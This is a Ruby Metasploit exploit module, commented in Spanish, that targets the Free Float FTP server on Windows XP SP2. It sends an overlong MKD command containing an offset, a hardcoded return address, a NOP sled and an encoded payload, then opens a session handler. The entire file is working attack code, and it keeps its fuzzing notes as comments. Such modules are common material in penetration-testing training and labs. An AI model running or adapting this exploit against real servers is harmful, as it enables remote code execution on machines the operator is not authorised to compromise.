require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote	# Tipo de exploit
	Rank = AverageRanking			# Confianza
	include Msf::Exploit::Remote::Ftp	# Conexion con ftp

	# Inicializacion
	def initialize(info={})
		super(update_info(info,
			'Name'		=> 'Free Float FTP',
			'Description'	=> 'BoF for FreeFloatFTP server',
			'Author'	=> ':v',
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision: $',
			'References'	=> [['URL','http://www.example.com'],],
			'DefaultOptions'=> {'EXITFUNC' => 'process',},
			'Payload'	=> {'BadChars' => "\x00\x0A\x0D",},
			'Platform'	=> ['win'],
			# Direccion de memoria encontrada, no LSB
			'Targets'	=> [['Windows XP SP2',{'Ret'=>0x773A4540,'Offset' => 248}],], #\x40\x45\x3A\x77
			'DisclosureDate'=> 'Jun 12 2018',
			'DefaultTarget'	=> 0))
	end
	def exploit
		connect
		print_status("Trying to connect ... ")
		# fuzz = "A"*248+"B"*4+"C"*748
		buf = rand_text_alpha_upper(target['Offset'])
		buf << [target['Ret']].pack('V')
		print_status([target['Ret']].pack('V'))
		buf << make_nops(20)
		buf << payload.encoded
		#buf =  "A"*248
		#buf << "B"*4
		#buf << "C"*748

		send_cmd(['MKD',buf],false)
		handler
		disconnect
	end
end